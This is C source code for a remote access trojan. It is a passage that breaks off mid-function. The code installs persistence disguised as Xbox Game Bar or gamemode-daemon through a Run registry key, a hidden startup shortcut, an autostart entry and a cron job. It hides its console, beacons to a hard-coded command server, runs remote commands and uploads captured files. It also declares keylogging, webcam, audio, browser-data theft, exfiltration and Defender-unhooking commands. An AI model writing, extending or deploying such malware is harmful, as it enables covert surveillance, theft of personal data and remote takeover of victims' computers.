#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>

// Platform-specific includes
#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #include <mmsystem.h>
    #include <iphlpapi.h>
    #include <psapi.h>
    #include <tlhelp32.h>
    #include <shlobj.h>
    #include <ws2tcpip.h>
    #include <wlanapi.h>
    #include <devpkey.h>
    #include <setupapi.h>
    #include <cfgmgr32.h>
    #include <powrprof.h>
    #include <ntddscsi.h>
    #include <winioctl.h>
    #include <hidclass.h>
    #include <winternl.h>
    #include <direct.h>
    #include <initguid.h>
    #include <usbiodef.h>
    #include <audioclient.h>
    #include <mmdeviceapi.h>
    #include <functiondiscoverykeys.h>
    #include <commctrl.h>
    #include <shobjidl.h>  // For IShellLink and IPersistFile
    #include <objbase.h>   // For COM
    #include <wtsapi32.h>  // For session checking
    #include <highlevelmonitorconfigurationapi.h>
    #include <physicalmonitorenumerationapi.h>
    #include <endpointvolume.h>
    #include <mmdeviceapi.h>
    #include <functiondiscoverykeys_devpkey.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "wlanapi.lib")
    #pragma comment(lib, "setupapi.lib")
    #pragma comment(lib, "powrprof.lib")
    #pragma comment(lib, "winmm.lib")
    #pragma comment(lib, "ole32.lib")
    #pragma comment(lib, "comctl32.lib")
    #pragma comment(lib, "gdi32.lib")
    #pragma comment(lib, "user32.lib")
    #pragma comment(lib, "wtsapi32.lib")
    #pragma comment(lib, "dxva2.lib")
    #pragma comment(lib, "oleaut32.lib")
    #define close closesocket
    #define sleep(x) Sleep((x)*1000)
    #define usleep(x) Sleep((x)/1000)
    typedef SOCKET socket_t;
    typedef HANDLE thread_t;
    #define INVALID_FD INVALID_SOCKET
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <ifaddrs.h>
    #include <pwd.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <sys/time.h>
    #include <dlfcn.h>
    #include <ctype.h>
    #include <fcntl.h>
    #include <sys/ioctl.h>
    #include <sys/mman.h>
    #include <arpa/inet.h>
    #include <pthread.h>
    #include <signal.h>
    #include <sys/wait.h>
    #include <net/if.h>
    #include <linux/videodev2.h>
    
    #ifndef __APPLE__
        #include <X11/Xlib.h>
        #include <X11/Xutil.h>
        #include <X11/keysym.h>
        #include <X11/extensions/XTest.h>
        #include <X11/Xatom.h>
    #endif
    
    #ifdef __linux__
        #include <linux/wireless.h>
        #include <netpacket/packet.h>
        #include <sys/io.h>
        #include <linux/thermal.h>
        #include <linux/input.h>
        #include <linux/uinput.h>
        #include <linux/hidraw.h>
    #endif
    
    #ifdef __APPLE__
        #include <sys/sysctl.h>
    #endif
    
    typedef int socket_t;
    typedef pthread_t thread_t;
    #define INVALID_FD -1
#endif

// Constants
#define MAX_COMMAND_LENGTH 256
#define MAX_OUTPUT_LENGTH 4096
#define MAX_PATH_LENGTH 1024
#define MAX_PROCESSES 512
#define MAX_NETWORK_CONNS 256
#define PORT_SCAN_LIMIT 1000
#define PATH_SEP "/"
#define TEMP_DIR "/tmp"
#define NULL_DEVICE "/dev/null"
#define SERVER_PORT 3323
#define BUFFER_SIZE 4096
#define CONNECTION_RETRY_INTERVAL 30  // seconds

// Video streaming definitions
#define VIDEO_DEVICE "/dev/video0"
#define WIDTH 640
#define HEIGHT 480
#define VIDEO_PORT 5000
#define MAX_CLIENTS 5
#define FRAME_DELAY 33333 // approx 30fps in microseconds

// Tunnel definitions
#define CLOUDFLARED_LINUX_URL  "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
#define CLOUDFLARED_WINDOWS_URL "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"

#ifdef _WIN32
  #define HIDDEN_DIR "\\.local_tunnels_bin"
#else
  #define HIDDEN_DIR "/.local_tunnels_bin"
#endif

// Global variables
char current_dir[MAX_PATH_LENGTH];
int realtime_monitoring = 0;
int keylogger_active = 0;
int input_blocked = 0;
pthread_t monitor_thread;
pthread_t keylogger_thread;
socket_t server_socket = INVALID_FD;
int connected_to_server = 0;
char server_ip[16] = "192.168.100.3";
char output_dir[MAX_PATH_LENGTH] = "output";
int file_monitoring_active = 0;
pthread_t file_monitor_thread;
int background_mode = 0;  // Flag for background operation

// Video streaming globals
int video_fd = -1;
socket_t video_server_fd = INVALID_FD;
volatile int video_streaming = 0;
pthread_t video_stream_thread;
struct buffer {
    void *start;
    size_t length;
};
struct buffer *buffers = NULL;
int n_buffers = 0;

// Add these global variables for geolocation log capture
char geo_logs[4096] = "";
pthread_mutex_t geo_logs_mutex = PTHREAD_MUTEX_INITIALIZER;
char chrome_log_path[512] = "";

// Geolocation globals
#ifdef _WIN32
HANDLE chrome_pid = NULL;
HANDLE monitor_pid = NULL;
pthread_mutex_init(&geo_logs_mutex, NULL);
#else
pid_t chrome_pid = 0;
pid_t monitor_pid = 0;
#endif

// Process information structure
typedef struct {
    int pid;
    char name[256];
    char user[256];
} ProcessInfo;

// Network connection structure
typedef struct {
    int pid;
    char local_addr[64];
    int local_port;
    char remote_addr[64];
    int remote_port;
    char state[32];
} NetworkConn;

// Tunnel structure
typedef struct {
    int pid;
    char tool[16];   // "ngrok" or "cloudflared"
    char port[16];   // the port number
    char url[256];   // the URL, if available
} TunnelInfo;

// Command structure
typedef struct {
    char *name;
    void (*func)(char **);
    char *description;
} Command;

// Function prototypes
void change_directory(char **args);
void list_directory(char **args);
void print_working_directory(char **args);
void create_note(char **args);
void show_help(char **args);
void vulnerability_scan(char **args);
void network_sniffer(char **args);
void keylogger(char **args);
void av_detection(char **args);
void firewall_check(char **args);
void startup_programs(char **args);
void running_processes(char **args);
void wifi_scanner(char **args);
void background_apps(char **args);
void webcam_access(char **args);
void take_screenshot(char **args);
void record_audio(char **args);
void block_input(char **args);
void terminate_process(char **args);
void extract_browser_data(char **args);
void exfiltrate_data(char **args);
void start_realtime_monitoring(char **args);
void show_monitoring_data(char **args);
void device_info(char **args);
void wallpaper_changer(char **args);
void enhanced_file_dump(char **args);
void exit_tool(char **args);
void clear_screen(char **args);
void wlan_control(char **args);
void fan_control(char **args);
void lan_intercept(char **args);
void unhook_defender(char **args);
void hardware_info(char **args);
void led_control(char **args);
void beeper_control(char **args);
void usb_dump(char **args);
void raw_socket(char **args);
void power_control(char **args);
void thermal_control(char **args);
void find_admin_processes(char **args);
void connect_to_server(char **args);
void disconnect_from_server(char **args);
void set_server_ip(char **args);
void pull_file(char **args);
void send_file(char **args);
void execute_application(char **args);
void volume_control(char **args);
void brightness_control(char **args);
void ring_command(char **args);

// New command prototypes
void run_video_stream(char **args);
void run_geolocation(char **args);
void stop_video_stream(char **args);
void process_tunnel_command(int argc, char **argv);

// Remote server functions
int connect_to_remote_server();
void send_to_server(const char *data);
void receive_from_server(char *buffer, int size);
void handle_remote_commands();
void send_buffer_to_server(const char *filename, const unsigned char *buffer, size_t size);
void send_screenshot_to_server();
void send_audio_to_server(int duration);
void maintain_server_connection();
void tunnel_command_wrapper(char **args);

// Background operation functions
int has_console();
void install_persistence();
void run_in_background();

// Audio recording for Windows
#ifdef _WIN32
void record_audio_to_memory(unsigned char **buffer, size_t *size, int duration);
#endif

// Video streaming functions
static int send_all(socket_t fd, const void *buf, size_t len);
int init_video(void);
void cleanup_video_resources(void);
#ifdef _WIN32
unsigned __stdcall video_client_thread(void* arg);
#else
void* video_client_thread(void* arg);
#endif

// Geolocation functions
void cleanup_chrome_profile(void);
void create_chrome_preferences(void);
void create_test_page(void);
void monitor_logs(void);
#ifdef _WIN32
unsigned __stdcall geolocation_monitor_thread(void* arg);
#else
void* geolocation_monitor_thread(void* arg);
#endif

// Tunnel functions
static void get_install_dir(char *buf, size_t len);
static bool ensure_dir_exists(const char *path);
static void make_executable_if_unix(const char *path);
static bool command_exists(const char *cmd);
static bool download_file(const char *url, const char *output);
static void install_cloudflared(void);
static bool is_process_running(const char *process_name);
static char* get_ngrok_url(void);
static bool kill_process(int pid);
static int get_tunnel_processes(TunnelInfo **tunnels);
static void start_tunnel(const char *tool, const char *port);
static void list_tunnels(void);
static void close_tunnel(int pid);
static void print_tunnel_help(void);
static void process_tunnel_expose(int argc, char **argv);
static void process_tunnel_close(int argc, char **argv);

Command commands[] = {
    {"cd", change_directory, "Change directory"},
    {"ls", list_directory, "List directory contents"},
    {"pwd", print_working_directory, "Print working directory"},
    {"note", create_note, "Create a text note"},
    {"help", show_help, "Show help for commands"},
    {"scan", vulnerability_scan, "Vulnerability scanner"},
    {"sniff", network_sniffer, "Network sniffer"},
    {"keylog", keylogger, "Keylogger (start/stop)"},
    {"av", av_detection, "Detect anti-virus software"},
    {"firewall", firewall_check, "Check firewall status"},
    {"startup", startup_programs, "List startup programs"},
    {"ps", running_processes, "List running processes"},
    {"wifi", wifi_scanner, "Scan WiFi networks"},
    {"bgapps", background_apps, "List background applications"},
    {"webcam", webcam_access, "Capture image from webcam"},
    {"screenshot", take_screenshot, "Take screenshot"},
    {"record", record_audio, "Record audio (10 sec)"},
    {"block", block_input, "Block input (on/off)"},
    {"kill", terminate_process, "Terminate process"},
    {"browser", extract_browser_data, "Extract browser data"},
    {"exfil", exfiltrate_data, "Exfiltrate data (http/ftp target [data])"},
    {"monitor", start_realtime_monitoring, "Start real-time monitoring"},
    {"show", show_monitoring_data, "Show monitoring data"},
    {"device", device_info, "Show detailed device information"},
    {"wallpaper", wallpaper_changer, "Change desktop wallpaper"},
    {"dump", enhanced_file_dump, "Enhanced file dump"},
    {"clear", clear_screen, "Clear screen"},
    {"exit", exit_tool, "Exit the tool"},
    {"wlan", wlan_control, "Wireless network manipulation"},
    {"fanctl", fan_control, "Control system fans"},
    {"lanintercept", lan_intercept, "LAN traffic interception"},
    {"unhookdefender", unhook_defender, "Unhook Windows Defender and add exception"},
    {"hwinfo", hardware_info, "Detailed hardware information"},
    {"ledctl", led_control, "Control system LEDs"},
    {"beeper", beeper_control, "Control system speaker"},
    {"usbdump", usb_dump, "USB traffic monitoring"},
    {"rawsock", raw_socket, "Raw socket operations"},
    {"power", power_control, "Power management control"},
    {"execute", execute_application, "Execute an application (use -headless for no window)"},
    {"thermal", thermal_control, "Thermal management control"},
    {"adminprocs", find_admin_processes, "Find processes running as admin"},
    {"connect", connect_to_server, "Connect to remote server"},
    {"disconnect", disconnect_from_server, "Disconnect from remote server"},
    {"serverip", set_server_ip, "Set remote server IP"},
    {"pull", pull_file, "Pull a file from client to server"},
    {"send", send_file, "Send a file from server to client"},
    {"volume", volume_control, "Control system volume (0-100)"},
    {"brightness", brightness_control, "Control screen brightness (0-100)"},
    {"ring", ring_command, "Play audio file (ring <path/to/audio>)"},
    {"stream", run_video_stream, "Start video streaming server"},
    {"geolocation", run_geolocation, "Start geolocation tracker"},
    {"stopstream", stop_video_stream, "Stop video streaming server"},
    {"tunnel", tunnel_command_wrapper, "Tunnel management (install/list/expose/close)"},
    {NULL, NULL, NULL}
};

// And keep the wrapper function definition where it is
void tunnel_command_wrapper(char **args) {
    // Count the number of arguments
    int argc = 0;
    while (args[argc] != NULL) {
        argc++;
    }
    
    // Call the actual function with the correct arguments
    process_tunnel_command(argc, args);
}

// Cross-platform command execution with output capture
void execute_command(const char *cmd, char *output, int max_len) {
    FILE *fp;
    
    #ifdef _WIN32
        fp = _popen(cmd, "r");
    #else
        fp = popen(cmd, "r");
    #endif
    
    if (fp == NULL) {
        strncpy(output, "Failed to execute command", max_len);
        return;
    }

    output[0] = '\0';
    char buffer[128];
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(output, buffer, max_len - strlen(output) - 1);
    }

    #ifdef _WIN32
        _pclose(fp);
    #else
        pclose(fp);
    #endif
}

// Create output directories
void create_output_directories() {
    const char* dirs[] = {
        "output",
        "output/screenshots",
        "output/audio",
        "output/notes",
        "output/dumps",
        "output/browser_data",
        "output/keystrokes",
        "output/captures",
        NULL
    };

    for (int i = 0; dirs[i] != NULL; i++) {
        #ifdef _WIN32
            _mkdir(dirs[i]);
        #else
            mkdir(dirs[i], 0755);
        #endif
    }
}

// Send buffer to server as file
void send_buffer_to_server(const char *filename, const unsigned char *buffer, size_t size) {
    if (!connected_to_server) return;
    
    // Send file header
    char header[256];
    snprintf(header, sizeof(header), "FILE:%s:%zu", filename, size);
    send_to_server(header);
    
    // Send buffer content in chunks
    size_t offset = 0;
    while (offset < size) {
        size_t chunk_size = (size - offset < BUFFER_SIZE) ? (size - offset) : BUFFER_SIZE;
        send(server_socket, buffer + offset, chunk_size, 0);
        offset += chunk_size;
    }
}

// Monitor output directory for new files
void* monitor_output_directory(void *arg) {
    char last_files[100][MAX_PATH_LENGTH] = {0};
    int file_count = 0;
    
    while (file_monitoring_active) {
        sleep(2); // Check every 2 seconds
        
        DIR *dir;
        struct dirent *entry;
        
        if ((dir = opendir(output_dir)) == NULL) {
            continue;
        }
        
        while ((entry = readdir(dir)) != NULL && file_count < 100) {
            // Skip "." and ".." entries
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
                continue;
            }
            
            char filepath[MAX_PATH_LENGTH];
            snprintf(filepath, sizeof(filepath), "%s/%s", output_dir, entry->d_name);
            
            // Use stat to check if this is a regular file
            struct stat file_stat;
            if (stat(filepath, &file_stat) == 0 && S_ISREG(file_stat.st_mode)) {
                // Check if this is a new file
                int is_new = 1;
                for (int i = 0; i < file_count; i++) {
                    if (strcmp(filepath, last_files[i]) == 0) {
                        is_new = 0;
                        break;
                    }
                }
                
                if (is_new) {
                    // Read file into memory and send to server
                    FILE *fp = fopen(filepath, "rb");
                    if (fp) {
                        fseek(fp, 0, SEEK_END);
                        long file_size = ftell(fp);
                        fseek(fp, 0, SEEK_SET);
                        
                        unsigned char *file_data = (unsigned char *)malloc(file_size);
                        if (file_data) {
                            fread(file_data, 1, file_size, fp);
                            send_buffer_to_server(entry->d_name, file_data, file_size);
                            free(file_data);
                        }
                        fclose(fp);
                    }
                    
                    // Add to our list of known files
                    if (file_count < 100) {
                        strcpy(last_files[file_count], filepath);
                        file_count++;
                    }
                }
            }
        }
        
        closedir(dir);
    }
    
    return NULL;
}

// Check if we have a console
int has_console() {
#ifdef _WIN32
    return GetConsoleWindow() != NULL;
#else
    return isatty(STDIN_FILENO);
#endif
}

// Install persistence - working version
void install_persistence() {
#ifdef _WIN32
    char current_path[MAX_PATH_LENGTH];
    GetModuleFileNameA(NULL, current_path, MAX_PATH_LENGTH);
    
    // Use TEMP directory first, then copy to AppData
    char temp_path[MAX_PATH_LENGTH];
    GetTempPathA(MAX_PATH_LENGTH, temp_path);
    
    char appdata_path[MAX_PATH_LENGTH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);
    
    // Create hidden directory with unique name
    char hidden_dir[MAX_PATH_LENGTH];
    snprintf(hidden_dir, sizeof(hidden_dir), "%s\\Microsoft\\Windows\\GameBar", appdata_path);
    CreateDirectoryA(appdata_path, NULL);
    CreateDirectoryA(strcat(appdata_path, "\\Microsoft"), NULL);
    CreateDirectoryA(strcat(appdata_path, "\\Windows"), NULL);
    
    snprintf(hidden_dir, sizeof(hidden_dir), "%s\\Microsoft\\Windows\\GameBar", appdata_path);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);
    snprintf(hidden_dir, sizeof(hidden_dir), "%s\\Microsoft\\Windows\\GameBar", appdata_path);
    CreateDirectoryA(hidden_dir, NULL);
    
    // Generate unique executable name based on computer name
    char computername[256];
    DWORD size = sizeof(computername);
    GetComputerNameA(computername, &size);
    
    char hidden_exe[MAX_PATH_LENGTH];
    snprintf(hidden_exe, sizeof(hidden_exe), "%s\\GameBar_%s.exe", hidden_dir, computername);
    
    // Copy file - overwrite if exists
    BOOL copied = CopyFileA(current_path, hidden_exe, FALSE);
    if (copied) {
        SetFileAttributesA(hidden_exe, FILE_ATTRIBUTE_HIDDEN);
    }
    
    // Try registry persistence FIRST (more reliable)
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, 
                                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                 0, KEY_WRITE, &hKey);
    
    if (result == ERROR_SUCCESS) {
        char cmd[MAX_PATH_LENGTH * 2];
        snprintf(cmd, sizeof(cmd), "\"%s\" --minimized", hidden_exe);
        RegSetValueExA(hKey, "GameBarService", 0, REG_SZ, (BYTE*)cmd, strlen(cmd) + 1);
        RegCloseKey(hKey);
    }
    
    // Also add to startup folder as backup
    char startup_path[MAX_PATH_LENGTH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) == S_OK) {
        char shortcut_path[MAX_PATH_LENGTH];
        snprintf(shortcut_path, sizeof(shortcut_path), "%s\\GameBar.lnk", startup_path);
        
        // Delete old shortcut if exists
        DeleteFileA(shortcut_path);
        
        // Create new shortcut
        IShellLinkA* psl;
        HRESULT hr = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
                                      &IID_IShellLinkA, (LPVOID*)&psl);
        if (SUCCEEDED(hr)) {
            char *userprofile = getenv("USERPROFILE");
            
            psl->lpVtbl->SetPath(psl, hidden_exe);
            psl->lpVtbl->SetArguments(psl, "--minimized");
            if (userprofile) {
                psl->lpVtbl->SetWorkingDirectory(psl, userprofile);
            }
            psl->lpVtbl->SetDescription(psl, "Xbox Game Bar");
            psl->lpVtbl->SetShowCmd(psl, SW_HIDE);
            
            IPersistFile* ppf;
            hr = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (LPVOID*)&ppf);
            if (SUCCEEDED(hr)) {
                WCHAR wsz[MAX_PATH];
                MultiByteToWideChar(CP_ACP, 0, shortcut_path, -1, wsz, MAX_PATH);
                ppf->lpVtbl->Save(ppf, wsz, TRUE);
                ppf->lpVtbl->Release(ppf);
            }
            psl->lpVtbl->Release(psl);
        }
    }
    
#else
    // Linux implementation
    char current_path[MAX_PATH_LENGTH];
    ssize_t len = readlink("/proc/self/exe", current_path, MAX_PATH_LENGTH - 1);
    if (len != -1) {
        current_path[len] = '\0';
    }
    
    char *home = getenv("HOME");
    if (!home) return;
    
    // Create hidden directory
    char hidden_dir[MAX_PATH_LENGTH];
    snprintf(hidden_dir, sizeof(hidden_dir), "%s/.local/share/gamemode", home);
    
    char cmd[MAX_PATH_LENGTH];
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", hidden_dir);
    system(cmd);
    
    char hidden_exe[MAX_PATH_LENGTH];
    snprintf(hidden_exe, sizeof(hidden_exe), "%s/gamemode-daemon", hidden_dir);
    
    // Copy file
    snprintf(cmd, sizeof(cmd), "cp -f '%s' '%s' && chmod +x '%s'", 
             current_path, hidden_exe, hidden_exe);
    system(cmd);
    
    // Create autostart directory
    char autostart_dir[MAX_PATH_LENGTH];
    snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", home);
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", autostart_dir);
    system(cmd);
    
    // Create desktop file
    char desktop_file[MAX_PATH_LENGTH];
    snprintf(desktop_file, sizeof(desktop_file), "%s/gamemode-daemon.desktop", autostart_dir);
    
    FILE *fp = fopen(desktop_file, "w");
    if (fp) {
        fprintf(fp, "[Desktop Entry]\n");
        fprintf(fp, "Type=Application\n");
        fprintf(fp, "Name=Gamemode Daemon\n");
        fprintf(fp, "Exec=%s --minimized\n", hidden_exe);
        fprintf(fp, "Path=%s\n", home);
        fprintf(fp, "Terminal=false\n");
        fprintf(fp, "NoDisplay=true\n");
        fprintf(fp, "X-GNOME-Autostart-enabled=true\n");
        fclose(fp);
        chmod(desktop_file, 0644);
    }
    
    // Add cron job
    snprintf(cmd, sizeof(cmd), 
             "(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s --minimized') | crontab -", 
             hidden_exe, hidden_exe);
    system(cmd);
#endif
}

// Run in background mode
void run_in_background() {
    background_mode = 1;
    
    // Force correct directory
    #ifdef _WIN32
        char *userprofile = getenv("USERPROFILE");
        if (userprofile != NULL) {
            chdir(userprofile);
            strncpy(current_dir, userprofile, sizeof(current_dir) - 1);
        } else {
            chdir("C:\\");
            strcpy(current_dir, "C:\\");
        }
        
        // Hide console
        FreeConsole();
    #else
        char *home = getenv("HOME");
        if (home != NULL) {
            chdir(home);
            strncpy(current_dir, home, sizeof(current_dir) - 1);
        } else {
            chdir("/");
            strcpy(current_dir, "/");
        }
    #endif
    
    // Verify
    char verify_dir[MAX_PATH_LENGTH];
    if (getcwd(verify_dir, sizeof(verify_dir)) != NULL) {
        strncpy(current_dir, verify_dir, sizeof(current_dir) - 1);
        current_dir[sizeof(current_dir) - 1] = '\0';
    }
    
    // Start server connection
    maintain_server_connection();
}

// Maintain server connection with continuous retrying
void maintain_server_connection() {
    while (1) {
        if (!connected_to_server) {
            if (connect_to_remote_server()) {
                // Start file monitoring when connected
                file_monitoring_active = 1;
                pthread_create(&file_monitor_thread, NULL, monitor_output_directory, NULL);
                
                // Handle remote commands
                handle_remote_commands();
                
                // If we get here, connection was lost
                file_monitoring_active = 0;
                pthread_join(file_monitor_thread, NULL);
            }
        }
        
        // Wait before retrying
        sleep(CONNECTION_RETRY_INTERVAL);
    }
}

// Connect to remote server
int connect_to_remote_server() {
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return 0;
        }
    #endif
    
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_FD) {
        return 0;
    }
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    #ifdef _WIN32
        server_addr.sin_addr.s_addr = inet_addr(server_ip);
    #else
        inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
    #endif
    
    if (connect(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(server_socket);
        server_socket = INVALID_FD;
        return 0;
    }
    
    // Send initial connection message with current directory
    char init_msg[MAX_PATH_LENGTH + 20];
    snprintf(init_msg, sizeof(init_msg), "CONNECTED:%s", current_dir);
    send_to_server(init_msg);
    
    connected_to_server = 1;
    return 1;
}

// Send data to server
void send_to_server(const char *data) {
    if (!connected_to_server || server_socket == INVALID_FD) {
        return;
    }
    
    send(server_socket, data, strlen(data), 0);
}

// Receive data from server
void receive_from_server(char *buffer, int size) {
    if (!connected_to_server || server_socket == INVALID_FD) {
        return;
    }
    
    recv(server_socket, buffer, size, 0);
}

void handle_remote_commands() {
    char buffer[BUFFER_SIZE];
    int receiving_file = 0;
    FILE *file_fp = NULL;
    size_t remaining_bytes = 0;
    char file_path[MAX_PATH_LENGTH];
    
    while (connected_to_server) {
        memset(buffer, 0, BUFFER_SIZE);
        
        if (receiving_file) {
            // Receiving file data
            size_t bytes_to_read = (remaining_bytes < BUFFER_SIZE) ? remaining_bytes : BUFFER_SIZE;
            int bytes_read = recv(server_socket, buffer, bytes_to_read, 0);
            
            if (bytes_read <= 0) {
                // Connection closed
                connected_to_server = 0;
                break;
            }
            
            fwrite(buffer, 1, bytes_read, file_fp);
            remaining_bytes -= bytes_read;
            
            if (remaining_bytes == 0) {
                fclose(file_fp);
                file_fp = NULL;
                receiving_file = 0;
                printf("File received: %s\n", file_path);
            }
        } else {
            // Receiving command
            int bytes_read = recv(server_socket, buffer, BUFFER_SIZE - 1, 0);
            
            if (bytes_read <= 0) {
                // Connection closed
                connected_to_server = 0;
                break;
            }
            
            buffer[bytes_read] = '\0';
            
            // Check for send command (file transfer from server to client)
            if (strncmp(buffer, "send ", 5) == 0) {
                // Parse command: send <file_path> <file_size>
                char *file_path_arg = strtok(buffer + 5, " ");
                char *file_size_arg = strtok(NULL, " ");
                
                if (file_path_arg && file_size_arg) {
                    strncpy(file_path, file_path_arg, sizeof(file_path) - 1);
                    remaining_bytes = atoi(file_size_arg);
                    
                    // Open file for writing
                    file_fp = fopen(file_path, "wb");
                    if (!file_fp) {
                        printf("Error: Failed to create file: %s\n", file_path);
                        continue;
                    }
                    
                    receiving_file = 1;
                    printf("Receiving file: %s (%zu bytes)\n", file_path, remaining_bytes);
                }
                continue;
            }
            
            // Parse command
            char *token;
            char *args[MAX_COMMAND_LENGTH / 2 + 1];
            int arg_count = 0;
            
            token = strtok(buffer, " ");
            while (token != NULL && arg_count < MAX_COMMAND_LENGTH / 2) {
                args[arg_count++] = token;
                token = strtok(NULL, " ");
            }
            args[arg_count] = NULL;
            
            // Execute command
            int found = 0;
            for (int i = 0; commands[i].name != NULL; i++) {
                if (strcmp(args[0], commands[i].name) == 0) {
                    // Redirect stdout to capture output
                    #ifdef _WIN32
                        freopen("temp_output.txt", "w", stdout);
                    #else
                        freopen("/tmp/temp_output.txt", "w", stdout);
                    #endif
                    
                    commands[i].func(args + 1);
                    
                    // Restore stdout
                    #ifdef _WIN32
                        freopen("CON", "w", stdout);
                    #else
                        freopen("/dev/tty", "w", stdout);
                    #endif
                    
                    // Read and send output
                    FILE *fp;
                    #ifdef _WIN32
                        fp = fopen("temp_output.txt", "r");
                    #else
                        fp = fopen("/tmp/temp_output.txt", "r");
                    #endif
                    
                    if (fp) {
                        char line[1024];
                        while (fgets(line, sizeof(line), fp)) {
                            send_to_server(line);
                        }
                        fclose(fp);
                    }
                    
                    found = 1;
                    break;
                }
            }
            
            if (!found) {
                char error_msg[256];
                snprintf(error_msg, sizeof(error_msg), "Unknown command: %s\n", args[0]);
                send_to_server(error_msg);
            }
            
            // Send command completion marker
            send_to_server("COMMAND_COMPLETE\n");
        }
    }
}

// Execute application
void execute_application(char **args) {
    printf("\n[Application Execution]\n");
    
    if (args[0] == NULL) {
        printf("Usage: execute <application_path> [arguments...] [-headless]\n");
        return;
    }
    
    // Check for headless flag
    int headless = 0;
    char *app_args[MAX_COMMAND_LENGTH / 2 + 1];
    int arg_count = 0;
    
    // Parse arguments and check for -headless flag
    for (int i = 0; args[i] != NULL; i++) {
        if (strcmp(args[i], "-headless") == 0) {
            headless = 1;
        } else {
            app_args[arg_count++] = args[i];
        }
    }
    app_args[arg_count] = NULL;
    
    printf("Executing: %s\n", app_args[0]);
    if (headless) {
        printf("Running in headless mode (no visible window)\n");
    }
    
#ifdef _WIN32
    // Windows implementation
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Build command line
    char cmd_line[MAX_COMMAND_LENGTH * 2] = "";
    for (int i = 0; app_args[i] != NULL; i++) {
        if (i > 0) strcat(cmd_line, " ");
        
        // Quote arguments with spaces
        if (strchr(app_args[i], ' ')) {
            strcat(cmd_line, "\"");
            strcat(cmd_line, app_args[i]);
            strcat(cmd_line, "\"");
        } else {
            strcat(cmd_line, app_args[i]);
        }
    }
    
    DWORD flags = 0;
    if (headless) {
        flags = CREATE_NO_WINDOW;
    }
    
    if (!CreateProcess(NULL, cmd_line, NULL, NULL, FALSE, flags, NULL, NULL, &si, &pi)) {
        char errorMsg[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                      NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                      errorMsg, sizeof(errorMsg), NULL);
        printf("Failed to execute application: %s\n", errorMsg);
        return;
    }
    
    printf("Process started with PID: %d\n", pi.dwProcessId);
    
    // Close handles to avoid resource leaks
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
#else
    // Linux implementation
    pid_t pid = fork();
    
    if (pid == 0) {
        // Child process
        if (headless) {
            // Create new session to detach from terminal
            setsid();
            
            // Redirect stdin, stdout, stderr to /dev/null
            freopen("/dev/null", "r", stdin);
            freopen("/dev/null", "w", stdout);
            freopen("/dev/null", "w", stderr);
        }
        
        // Check if the path contains a slash (indicating a file path)
        if (strchr(app_args[0], '/') != NULL) {
            // It's a file path, try to execute it directly
            if (access(app_args[0], X_OK) == 0) {
                execv(app_args[0], app_args);
            }
            // If we get here, execv failed
            fprintf(stderr, "Failed to execute %s: %s\n", app_args[0], strerror(errno));
            exit(EXIT_FAILURE);
        } else {
            // Try to find the executable in PATH
            char *path_env = getenv("PATH");
            if (path_env == NULL) {
                fprintf(stderr, "PATH environment variable not set\n");
                exit(EXIT_FAILURE);
            }
            
            // Try to execute directly first (in case it's in PATH)
            execvp(app_args[0], app_args);
            
            // If that fails, try to find it in PATH
            char *path = strdup(path_env);
            char *dir = strtok(path, ":");
            int found = 0;
            
            while (dir != NULL && !found) {
                char full_path[MAX_PATH_LENGTH];
                snprintf(full_path, sizeof(full_path), "%s/%s", dir, app_args[0]);
                
                if (access(full_path, X_OK) == 0) {
                    execv(full_path, app_args);
                    // If we get here, execv failed
                    fprintf(stderr, "Failed to execute %s: %s\n", full_path, strerror(errno));
                    found = 1;
                }
                
                dir = strtok(NULL, ":");
            }
            
            free(path);
            
            // If we get here, the executable was not found in PATH
            if (!found) {
                // Try current directory as a last resort
                char full_path[MAX_PATH_LENGTH];
                snprintf(full_path, sizeof(full_path), "./%s", app_args[0]);
                
                if (access(full_path, X_OK) == 0) {
                    execv(full_path, app_args);
                    // If we get here, execv failed
                    fprintf(stderr, "Failed to execute %s: %s\n", full_path, strerror(errno));
                } else {
                    fprintf(stderr, "Executable not found: %s\n", app_args[0]);
                    fprintf(stderr, "Please provide a full path or ensure the executable is in PATH\n");
                }
            }
            
            exit(EXIT_FAILURE);
        }
    } else if (pid < 0) {
        // Fork failed
